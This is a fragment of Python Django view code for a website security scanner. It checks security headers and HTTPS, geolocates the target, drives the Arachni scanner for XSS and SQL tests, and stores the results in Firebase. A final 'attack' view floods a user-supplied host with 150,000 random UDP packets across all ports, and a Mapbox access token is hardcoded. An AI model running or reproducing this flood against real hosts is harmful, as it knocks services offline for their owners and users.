    print ("ip: ",url , "portsOpen: ", fixed_list)
    
    ip_locate=urllib.request.urlopen("http://ip-api.com/json/"+url_inp)
    data=ip_locate.read()
    values=json.loads(data)
    print(values)
    val=values['lat']
    val2=values['lon']
    

    scoring=31-len(fixed_list)
    #----------------------------------------------
     #sending to firebase
    

    foo = SecurityHeaders()

    # parsed = urlparse(url)
    # if not parsed.scheme:
    #     url = 'http://' + url # defasult to http if scheme not provided


    headers = foo.check_headers(url_inp)

    if not headers:
        print ("Failed to fetch headers, exiting...")
        sys.exit(1)

    okColor = '\033[92m'
    warnColor = '\033[93m'
    endColor = '\033[0m'
    
    for header, value in headers.items():
        if value['warn'] == 1:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + warnColor + 'WARN' + endColor + ' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + warnColor + 'WARN' + endColor + ' ]')
                scoring=scoring+1
        elif value['warn'] == 0:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + okColor + 'OK' + endColor +' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + okColor + 'OK' + endColor + ' ]')
                scoring=scoring+1

    https = foo.test_https(url_inp)
    if https['supported']:
        print('HTTPS supported ... [ ' + okColor + 'OK' + endColor + ' ]')
        scoring=scoring+1
    else:
        print('HTTPS supported ... [ ' + warnColor + 'FAIL' + endColor + ' ]')

    if https['certvalid']:
        print('HTTPS valid certificate ... [ ' + okColor + 'OK' + endColor + ' ]')
        scoring=scoring+1
    else:
        print('HTTPS valid certificate ... [ ' + warnColor + 'FAIL' + endColor + ' ]')


    if foo.test_http_to_https(url, 5):
        print('HTTP -> HTTPS redirect ... [ ' + okColor + 'OK' + endColor + ' ]')
        scoring=scoring+1
        if not re.match('(?:http|https)://', url):
            url='https://{}'.format(url_inp)
        else:
            pass
    
    else:
        print('HTTP -> HTTPS redirect ... [ ' + warnColor + 'FAIL' + endColor + ' ]')
        if not re.match('(?:http|https)://', url):
            url='http://{}'.format(url_inp)
        else:
            pass
    
   
    

    # if not re.match('(?:http|https)://', url):
    #     url='https://{}'.format(url)
    # else:
    #     pass
    
    print(url)
    p=subprocess.Popen([r'.\mysite\myapp\arachni-1.5.1-0.5.12-windows-x86_64\bin\arachni_rest_server.bat'])
    time.sleep(20)
    a = ArachniClient()
    resumeFlag = False
    authFlag = False
    scanType = ""
    
    #checks for existing scans and resumes from there instead
    avail_scan_object = a.get_scans() #returns json object of available scans
    print(a.get_scans()) #displays available scans | testing only

    for x in avail_scan_object: #check if avail scan is ongoing
        status_object = a.get_status(x)
        if(status_object["busy"] == True): #break and resume last scan if scan is still ongoing
            scan_ID = x
            resumeFlag = True
            start_time = time.time()
            break
    
    if(resumeFlag == False):
      
        checkAuth="y"
        while checkAuth not in ("y","n"):
            print("Invalid input")
          
            checkAuth = input("Do you want to perform an Authenticated Scan? (y/n): ")

    #select scan type here then ask if user would like to use authenticated scanning

    #start new scan if there are no ongoing ones
    if(resumeFlag == False and checkAuth == "n"):
        print("Normal scan")

        checkNormalScanType = int(request.POST.get("scanType"))

        while checkNormalScanType not in [1,2,3,4]:
            print("Invalid input")
         
            checkNormalScanType = input("Please select a scan type [1 - full audit, 2 - xss, 3 - sql, 4 - server]: ")
        scanType = a.selectNormalScan(checkNormalScanType)
        print(scanType)
        try:
            a.target(url)
            scan_json_object = a.start_scan() #outputs json dictionary
            scan_ID = scan_json_object["id"]
            start_time = time.time()
        except Exception as e:
            print(e)

    #start auth scan if user chose yes
    elif(resumeFlag == False and checkAuth == "y"):
        authFlag = True
        checkAuthScanType = int(request.POST.get("scanType"))
        while checkAuthScanType not in [1,2,3,4]:
            print("Invalid input")
           
            checkAuthScanType = input("Please select a scan type [1 - full audit, 2 - xss, 3 - sql, 4 - server]: ")
        print("Authenticated scan")
        scanType = a.selectAuthScan(checkAuthScanType,url,username,password,usernameinp,passwordinp)
        scan_json_object = a.start_scan() #outputs json dictionary
        scan_ID = scan_json_object["id"]
        start_time = time.time()

    print("passes")
    scanflag=True
    while scanflag is True:
    
        print("Resumed scan? | ", resumeFlag)
        print("Authenticated? | ", authFlag)
        print("The scan is ongoing...")
        
        status_object = a.get_status(scan_ID)
        print("Current page is: ", status_object["statistics"]["current_page"])
        print("Total audited pages are: ", status_object["statistics"]["audited_pages"])
        print("Total found pages are: ", status_object["statistics"]["found_pages"])
        print("Elapsed time is: ", status_object["statistics"]["runtime"])
        print("Current status is: ", status_object["status"])
        print("Current busy flag is: ", status_object["busy"])

        if(status_object["busy"] == False):
            print("Total scan time: ", status_object["statistics"]["runtime"])
            print("Scan has been completed, retrieving report...")
            a.getScanReport(scan_ID,"json") #output to json for database processing
            a.getScanReport(scan_ID,"html") #output to html for user ease of interaction
            # a.processJSON(scan_ID) #print out choice information
            scanflag=False
        
            time.sleep(10)
            fixed_scan_Id=scan_ID[:20]
            a.delete_scan(scan_ID)
            print("testpass")
            

            
            
            tofirebase={"ip":url_inp,"port_open":fixed_list, "ip_info":values, "head_found":headers}
           
            emailtofirebase=login_email_rn.replace(".","_")

            now_today=datetime.now().strftime("%d%m%Y%H%M%S")
           
            url_tofirebase=url_inp.replace(".","_")+"_"+now_today
          
            print(url_tofirebase)
            db.child(emailtofirebase).child("scans").child(url_tofirebase).set(tofirebase) 
            
            
            try:
                with open("myapp/reports/"+fixed_scan_Id+ ".json", encoding="utf-8") as jsonfile:
                    json_obj = json.load(jsonfile)
                    print(json_obj['issues'])
                    try:
                        if json_obj['issues'] !=[]:
                            for x in json_obj['issues']:
                                
                                if x['name']=="Interesting response":
                                    to_firebase={"issues":x['name'],"description":x['description']}
                                    db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").child(x['name']).set(to_firebase)
                                else:
                                    to_firebase={"issues":x['name'],"description":x['description'],"remedy":x['remedy_guidance'],"url_issue":x['vector']['url']}
                                    db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").child(x['name']).set(to_firebase)
                        
                            
                        else:
           

                            to_firebase={"issues":"None"}
                            db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").update(to_firebase) 

                        count=0
                        if json_obj['sitemap'] is not None:
                            
                            for xy in json_obj['sitemap']: 
                                count+=1 
                                
                                nummm=str(json_obj['sitemap'][xy])   
                                to_f={count:xy}                    
                                db.child(emailtofirebase).child("scans").child(url_tofirebase).child("sitemap").update(to_f)

                    except Exception as e:
                        print(e)

            except:
                print("File not found!")
            scanflag=False
      

    #the pdf generator is here
   
    pdf_generator(url_tofirebase,emailtofirebase)
    p.kill()
    
    keys=[]
    descr=[]
    remedy=[]
    url_issue=[]
    emel=login_email_rn.replace(".","_")
    extract = db.child(emel).child("scans").child(url_tofirebase).child("issues").get()
    

    for x in extract.each():
        if x.key()=="issues":
            keys.append("None")
            descr.append("None")
            remedy.append("None")
            url_issue.append("None")
            

        else:
            keys.append(x.key())
            descr.append(x.val()['description'])
            remedy.append(x.val()['remedy'])
            url_issue.append(x.val()['url_issue'])

    visited_links=[]
    extract_sitemap= db.child(emel).child("scans").child(url_tofirebase).child("sitemap").get()
    for x in extract_sitemap.each():
        visited_links.append(x.val())

    thisonetrust(fixed_scan_Id,login_email_rn,re.sub('[.:/]','_',url),url_tofirebase)
     

    c=(scoring/36)*100
    tole_firebase={"z_scor":c,"z_lat":val,"z_long":val2}
    db.child(emailtofirebase).child("scan_check").set(0)
    db.child(emailtofirebase).child("scans").child(url_tofirebase).update(tole_firebase)
    return render(request, 'report.html',{'data':fixed_list,'data2':round(c),'data3':val,'data4':val2, 'data5':list(set(visited_links)),"urlfirebase":url_inp,"keysNvalue":zip(keys,descr,remedy,url_issue)})

def default_map(request):
    mapbox_access_token = 'pk.eyJ1IjoibWFzdGVyZWxhaGVlIiwiYSI6ImNrOWp0am43MTFtM3IzbHA0dzhuOHZiN3UifQ.kgIXiMoyl9tfKZcFys9b_Q'
    return render(request, 'default.html', {'mapbox_access_token': mapbox_access_token})


def attack(request):
    remoteServer2    = request.POST.get('param2')
    remoteServerIP2  = socket.gethostbyname(remoteServer2)
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    bytes = random._urandom(1490)
    sent = 0
    port=80
    while sent<150000:
        sock2.sendto(bytes, (remoteServerIP2,port))
        sent = sent + 1
        port = port + 1
        print ("Sent %s packet to %s throught port:%s"%(sent,remoteServerIP2,port))
        if port == 65534:
            port = 1
    
